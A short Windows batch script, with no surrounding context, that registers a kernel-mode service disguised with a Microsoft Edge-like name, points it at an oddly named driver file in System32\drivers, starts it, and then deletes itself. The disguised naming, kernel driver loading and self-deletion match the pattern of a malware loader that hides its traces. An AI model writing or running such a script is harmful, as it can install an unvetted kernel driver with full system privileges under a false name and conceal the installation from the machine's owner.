@echo off
cd %~dp0
sc create MicrosoftEdgeServiceElevation_8574 binpath=C:\Windows\System32\drivers\MegaSes2i.sys type=kernel
sc start MicrosoftEdgeServiceElevation_8574
del "%~f0"